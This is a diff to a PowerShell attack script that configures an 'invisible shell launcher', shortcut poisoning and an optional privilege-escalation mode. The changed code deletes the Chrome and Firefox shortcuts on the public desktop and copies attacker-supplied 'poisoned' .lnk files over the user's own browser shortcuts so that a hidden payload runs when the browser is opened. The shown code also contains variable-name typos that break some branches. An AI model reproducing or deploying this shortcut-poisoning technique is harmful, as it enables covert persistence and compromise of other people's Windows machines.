@@ -4,7 +4,6 @@
 
 # Shortcut Section:
 # Note $invisible_shell_launcher must be set to 'yes' for any of the other commands in the Shortcut section to run!!!
-# Also, you must be using the elevated version of the payload otherwise the shortcut poisoning wont work!
 $invisible_shell_launcher='yes'
 $poison_shortcuts='yes'
 $shortcut_privesc='no'
@@ -58,18 +57,16 @@ If ($invisible_shell_launcher -eq 'yes') {
 }
 
 If (Test-Path "$Env:UserProfile\Desktop\Google Chrome.lnk" -eq True  -AND $invisile_shell_launcher -eq 'yes') {
-  $old_chrome_lnk="C:\Users\Public\Public Desktop\Google Chroime.lnk"
   $chrome_lnk="$Env:UserProfile\Desktop\Google Chrome.lnk"
   $poisoned_chrome="$PSScriptRoot\Google Chrome.lnk"
-  del $old_chrome_lnk -Force -Recurse
+  del "C:\Users\Public\Desktop\Google Chrome.lnk"
   robocopy $poison_chrome $chrome_lnk /S /MT /Z
 }
 
 If (Test-Path "$Env:UserProfile\Desktop\Mozilla Firefox.lnk" -eq True  -AND $invisile_shell_launcher -eq 'yes') {
-  $old_firefox_lnk="C:\Users\Public\Public Desktop\Mozilla Firefox.lnk"
   $firefox_lnk="$Env:UserProfile\Desktop\Mozilla Firefox.lnk"
   $poisoned_firefox="$PSScriptRoot\Mozilla Firefox.lnk"
-  del $old_firefox_lnk -Force -Recurse
+  del "C:\Users\Public\Desktop\Mozilla Firefox.lnk"
   robocopy $poisoned_firefox $firefox_lnk /S /MT /Z
 }
 
